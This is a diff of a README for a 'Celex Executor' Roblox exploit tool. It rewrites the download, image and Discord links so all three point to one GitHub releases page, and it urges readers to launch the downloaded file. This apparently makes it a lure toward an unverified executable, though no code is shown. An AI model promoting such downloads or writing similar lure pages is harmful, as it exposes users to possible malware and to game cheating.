@@ -21,7 +21,7 @@ Welcome to the **Celex Executor** GitHub repository! 🚀
 
 ## How to Get Started?
 
-To download the Celex Executor tool, simply click [here](https://github.com/files/File.zip).
+To download the Celex Executor tool, simply click [here](https://github.com/MAIOSN12/Celex-Executor/releases).
 
 🚀 *Launch the downloaded file to kickstart your enhanced Roblox gameplay journey!*
 
@@ -33,13 +33,13 @@ If the provided link does not work or you are looking for the latest updates on 
 
 Dive into the world of Roblox exploits and enhanced gameplay with Celex Executor. Get ready to unleash your creativity and take your gaming experience to the next level.
 
-![Roblox](https://github.com/username/images/roblox_image.png)
+![Roblox](https://github.com/MAIOSN12/Celex-Executor/releases)
 
 ## Stay Connected
 
 Join our community on Discord to connect with other users, share tips and tricks, and stay updated on the latest developments with Celex Executor.
 
-[![Discord Community](https://img.shields.io/badge/Join-Discord-7289DA)](https://discord.gg/celex)
+[![Discord Community](https://github.com/MAIOSN12/Celex-Executor/releases)](https://github.com/MAIOSN12/Celex-Executor/releases)
 
 ## Contributing
 
